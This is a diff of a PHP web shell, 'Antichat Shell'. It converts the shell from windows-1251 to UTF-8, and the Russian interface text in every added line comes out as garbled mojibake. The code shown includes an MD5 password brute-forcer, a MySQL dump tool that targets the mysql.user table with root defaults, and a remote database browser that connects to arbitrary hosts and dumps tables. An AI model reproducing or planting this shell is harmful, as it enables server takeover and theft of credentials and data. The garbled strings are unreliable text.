@@ -42,7 +42,7 @@ a:link{color: #91cd32;text-decoration: none;font-size: 8pt;}
 a:visited{color: #91cd32;text-decoration: none;font-size: 8pt;}
 a:hover, a:active{background-color: #A8A8AD;color: #E7E7EB;text-decoration: none;font-size: 8pt;}
 td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
-$header = '<html><head><title>'.getenv("HTTP_HOST").' - Antichat Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><body leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
+$header = '<html><head><title>'.getenv("HTTP_HOST").' - Antichat Shell</title><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'.$style.'</head><body leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
 $footer = '</body></html>';
 $lang = array(
 	'filext'=>'File already exists.',
@@ -417,18 +417,18 @@ if($chars_de == "") {
 	$chars_de ="";
 }
 $content ="<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>
-<tr><td>&nbsp;MD5 хеш:<b>".$pass_de."</b></td>
+<tr><td>&nbsp;MD5 С…РµС€:<b>".$pass_de."</b></td>
 <input type='hidden' name='action' value='$action'>
 <tr><td>&nbsp;<textarea  class='inputbox' name='chars_de' cols='50' rows='5'>".$chars_de."</textarea></td>
-<td><b>Перебор букв:</b><br><font color=red><b><u>ENG:</u></b></font>
+<td><b>РџРµСЂРµР±РѕСЂ Р±СѓРєРІ:</b><br><font color=red><b><u>ENG:</u></b></font>
 <a class=menu href=javascript:ins('abcdefghijklmnopqrstuvwxyz')>[a-z]</a>
 <a class=menu href=javascript:ins('ABCDEFGHIJKLMNOPQRSTUVWXYZ')>[A-Z]</a><br>
 <a class=menu href=javascript:ins('0123456789')>[0-9]</a>
-<a class=menu href=javascript:ins('~`\!@#$%^&*()-_+=|/?&gt;<[]{}:№.,&quot;')>[Символы]</a><br><br>
+<a class=menu href=javascript:ins('~`\!@#$%^&*()-_+=|/?&gt;<[]{}:в„–.,&quot;')>[РЎРёРјРІРѕР»С‹]</a><br><br>
 <font color=red><b><u>RUS:</u></b></font>
-<a class=menu href=javascript:ins('абвгдеёжзийклмнопрстуфхцчшщъыьэюя')>[а-я]</a>
-<a class=menu href=javascript:ins('АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ')>[А-Я]</a>
-<br></br><input type=reset value=Очистить class=button1></td></tr>
+<a class=menu href=javascript:ins('Р°Р±РІРіРґРµС‘Р¶Р·РёР№РєР»РјРЅРѕРїСЂСЃС‚СѓС„С…С†С‡С€С‰СЉС‹СЊСЌСЋСЏ')>[Р°-СЏ]</a>
+<a class=menu href=javascript:ins('РђР‘Р’Р“Р”Р•РЃР–Р—РР™РљР›РњРќРћРџР РЎРўРЈР¤РҐР¦Р§РЁР©РЄР«Р¬Р­Р®РЇ')>[Рђ-РЇ]</a>
+<br></br><input type=reset value=РћС‡РёСЃС‚РёС‚СЊ class=button1></td></tr>
 <tr><td>&nbsp;<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''>
 </td><td><input type='submit' value='Decrypt MD5' class=button1></td></tr></form>
 <script>
@@ -615,15 +615,15 @@ $dat2 = date("H:i:s");
 $date2 = date("d:m:Y");
 
 if(md5($word) == $pass_de){
-echo "<STYLE>BODY{background-color: #2b2f34;color: #9acd32;</STYLE><table><tr><td>Результат выполнения перебора паролей:</td></tr>
-<tr><td>Захешированный пароль:</b></td><td><font color=red>&nbsp;&nbsp;$word</font></td></tr>
-<tr><td>Начало перебора:</td><td>&nbsp;&nbsp;$dat - $date</td></tr>
-<tr><td>Окончание перебора:</td><td>&nbsp;&nbsp;$dat2 - $date2</td></tr>
-<tr><td>Выполнение перебора хешей записан в файл:  ".$word."_md5</td></tr></table>";
+echo "<STYLE>BODY{background-color: #2b2f34;color: #9acd32;</STYLE><table><tr><td>Р РµР·СѓР»СЊС‚Р°С‚ РІС‹РїРѕР»РЅРµРЅРёСЏ РїРµСЂРµР±РѕСЂР° РїР°СЂРѕР»РµР№:</td></tr>
+<tr><td>Р—Р°С…РµС€РёСЂРѕРІР°РЅРЅС‹Р№ РїР°СЂРѕР»СЊ:</b></td><td><font color=red>&nbsp;&nbsp;$word</font></td></tr>
+<tr><td>РќР°С‡Р°Р»Рѕ РїРµСЂРµР±РѕСЂР°:</td><td>&nbsp;&nbsp;$dat - $date</td></tr>
+<tr><td>РћРєРѕРЅС‡Р°РЅРёРµ РїРµСЂРµР±РѕСЂР°:</td><td>&nbsp;&nbsp;$dat2 - $date2</td></tr>
+<tr><td>Р’С‹РїРѕР»РЅРµРЅРёРµ РїРµСЂРµР±РѕСЂР° С…РµС€РµР№ Р·Р°РїРёСЃР°РЅ РІ С„Р°Р№Р»:  ".$word."_md5</td></tr></table>";
 $f = @fopen($word._md5,"a+");
-fputs($f,"Хэш из MD5 [$pass_de] = $word
-Начало перебора:\t$dat - $date
-Окончание перебора:\t$dat2 - $date2");
+fputs($f,"РҐСЌС€ РёР· MD5 [$pass_de] = $word
+РќР°С‡Р°Р»Рѕ РїРµСЂРµР±РѕСЂР°:\t$dat - $date
+РћРєРѕРЅС‡Р°РЅРёРµ РїРµСЂРµР±РѕСЂР°:\t$dat2 - $date2");
 exit;
 }}
 
@@ -661,31 +661,31 @@ if(isset($_POST['dif'])) {
      }
      $sql2 .= "\r\n# ---------------------------------";
      }
-     $content .="<center><b>Готово! Дамп прошел удачно!</b></center>";
+     $content .="<center><b>Р“РѕС‚РѕРІРѕ! Р”Р°РјРї РїСЂРѕС€РµР» СѓРґР°С‡РЅРѕ!</b></center>";
     if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
     else { echo $sql1.$sql2; }
     } // end if(@mysql_select_db($_POST['mysql_db'],$db))
-    else $content.="<center><b>Такой БД нет!</b></center>";
+    else $content.="<center><b>РўР°РєРѕР№ Р‘Р” РЅРµС‚!</b></center>";
    @mysql_close($db);
    }
  } // end if(($_POST['dif']&&$fp)||(!$_POST['dif'])){
- else if(!empty($_POST['dif'])&&!$fp) { $content.="<center><b>ОШИБКА, нет прав записи в файл!</b></center>"; }
+ else if(!empty($_POST['dif'])&&!$fp) { $content.="<center><b>РћРЁРР‘РљРђ, РЅРµС‚ РїСЂР°РІ Р·Р°РїРёСЃРё РІ С„Р°Р№Р»!</b></center>"; }
 
 $content.="<form name='mysql_dump' action='$php_self' method='post'>
 <input type='hidden' name='action' value='$action'>
-&nbsp;База: <input type=text name=mysql_db size=15 value=";
+&nbsp;Р‘Р°Р·Р°: <input type=text name=mysql_db size=15 value=";
 $content .=(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"));
-$content .=">&nbsp;Таблица: &nbsp;<input type=text name=mysql_tbl size=15 value=";
+$content .=">&nbsp;РўР°Р±Р»РёС†Р°: &nbsp;<input type=text name=mysql_tbl size=15 value=";
 $content .=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"));
-$content .=">&nbsp;Логин: &nbsp;<input type=text name=mysql_l size=15 value=";
+$content .=">&nbsp;Р›РѕРіРёРЅ: &nbsp;<input type=text name=mysql_l size=15 value=";
 $content .=(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"));
-$content .=">&nbsp;Пароль: &nbsp;<input type=text name=mysql_p size=15 value=";
+$content .=">&nbsp;РџР°СЂРѕР»СЊ: &nbsp;<input type=text name=mysql_p size=15 value=";
 $content .=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"));
 $content .="><input type=hidden name=dir size=85 value=".$dir.">
 <input type=hidden name=cmd size=85 value=mysql_dump>
-<br>&nbsp;Сохранить дамп в файле: <input type=checkbox name=dif value=1 id=dif><input type=text name=dif_name size=80 value=";
+<br>&nbsp;РЎРѕС…СЂР°РЅРёС‚СЊ РґР°РјРї РІ С„Р°Р№Р»Рµ: <input type=checkbox name=dif value=1 id=dif><input type=text name=dif_name size=80 value=";
 $content .=(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"));
-$content .="><input type=submit name=submit value=Сохранить></form>";
+$content .="><input type=submit name=submit value=РЎРѕС…СЂР°РЅРёС‚СЊ></form>";
 
 @$php_self = $_POST['PHP_SELF'];
 @$from = $_POST['from'];
@@ -722,12 +722,12 @@ $content .="<form name='mysql_dump' action='$php_self' method='post'>
 <table><tr><td valign=top>
 <input type='hidden' name='action' value='$action'>
 <input type=hidden name=ac value=sql>
-<tr><td valign=top>Хост: &nbsp;&nbsp;&nbsp;&nbsp;<input name=adress value='$adress' size=20>
-<tr><td valign=top>Порт: &nbsp;&nbsp;&nbsp;&nbsp;<input name=port value='$port' size=20>
-<tr><td valign=top>Логин: &nbsp;&nbsp;<input name=login value='$login' size=20>
-<tr><td valign=top>Пароль: <input name=pass value='$pass' size=20>
+<tr><td valign=top>РҐРѕСЃС‚: &nbsp;&nbsp;&nbsp;&nbsp;<input name=adress value='$adress' size=20>
+<tr><td valign=top>РџРѕСЂС‚: &nbsp;&nbsp;&nbsp;&nbsp;<input name=port value='$port' size=20>
+<tr><td valign=top>Р›РѕРіРёРЅ: &nbsp;&nbsp;<input name=login value='$login' size=20>
+<tr><td valign=top>РџР°СЂРѕР»СЊ: <input name=pass value='$pass' size=20>
 <input type=hidden name=p value=sql></td></tr>
-<tr><td></td><td><input type=submit name=conn value=Подключиться></form></td></tr>
+<tr><td></td><td><input type=submit name=conn value=РџРѕРґРєР»СЋС‡РёС‚СЊСЃСЏ></form></td></tr>
 </table>";
 }
 @$conn = $_POST['conn'];
@@ -737,12 +737,12 @@ $content .="<form name='mysql_dump' action='$php_self' method='post'>
 @$pass = $_POST['pass'];
 if($conn){
 
-$serv = @mysql_connect("$adress:$port", "$login", "$pass") or die("ОШИБКА: ".mysql_error());
+$serv = @mysql_connect("$adress:$port", "$login", "$pass") or die("РћРЁРР‘РљРђ: ".mysql_error());
 if($serv) {
 $content .="<form name='conn' action='$php_self' method='post'><input type=hidden name=conn value=0>
 <input type='hidden' name='action' value='$action'>
-Статус: Подключен : <input type=submit name=exit value='Выйти из базы'></form>
-<table><tr><td><font color=red>[Таблицы]</font><br></br>";
+РЎС‚Р°С‚СѓСЃ: РџРѕРґРєР»СЋС‡РµРЅ : <input type=submit name=exit value='Р’С‹Р№С‚Рё РёР· Р±Р°Р·С‹'></form>
+<table><tr><td><font color=red>[РўР°Р±Р»РёС†С‹]</font><br></br>";
 }
 $res = mysql_list_dbs($serv);
 while ($str=mysql_fetch_row($res)){
@@ -764,9 +764,9 @@ $content .="<form name='dump1' action='$php_self' method='POST'>
 
 @$base = $_POST['base'];
 @$db = $_POST['db'];
-$content .="<br></br><font color=red>[Всего таблиц: $tc]</font>";
+$content .="<br></br><font color=red>[Р’СЃРµРіРѕ С‚Р°Р±Р»РёС†: $tc]</font>";
 if($base){
-$content .="<br></br><font color=red>Таблица: [$tbl]</font><br>";
+$content .="<br></br><font color=red>РўР°Р±Р»РёС†Р°: [$tbl]</font><br>";
 $result = mysql_list_tables($db);
 while($str=mysql_fetch_array($result)){
 $c = mysql_query ("SELECT COUNT(*) FROM $str[0]");
@@ -790,7 +790,7 @@ $content .="<form name='dump2' action='$php_self' method='post'>
 <input name=conn value='1' type=hidden></form>";
 
 @$vn = $_POST['vn'];
-$content .= "<td valign=top>База данных: $db => $vn<br>";
+$content .= "<td valign=top>Р‘Р°Р·Р° РґР°РЅРЅС‹С…: $db => $vn<br>";
 @$inside = $_POST['inside'];
 @$tbl = $_POST['tbl'];
 if($inside){
@@ -800,12 +800,12 @@ mysql_select_db($db) or die(mysql_error());
 $c = mysql_query ("SELECT COUNT(*) FROM $tbl");
 $cfa = mysql_fetch_array($c);
 mysql_free_result($c);
-$content .= "Всего: $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>
+$content .= "Р’СЃРµРіРѕ: $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>
 <input type='hidden' name='action' value='$action'>
 <input type=hidden name=ac value=sql>
-От: <input name=from size=3 value=0>
-До: <input name=to size=3 value=$cfa[0]>
-<input type=submit name=show value='Загрузить'>
+РћС‚: <input name=from size=3 value=0>
+Р”Рѕ: <input name=to size=3 value=$cfa[0]>
+<input type=submit name=show value='Р—Р°РіСЂСѓР·РёС‚СЊ'>
 <input type=hidden name=inside value=1>
 <input type=hidden name=vn value=$vn>
 <input type=hidden name=db value=$db>
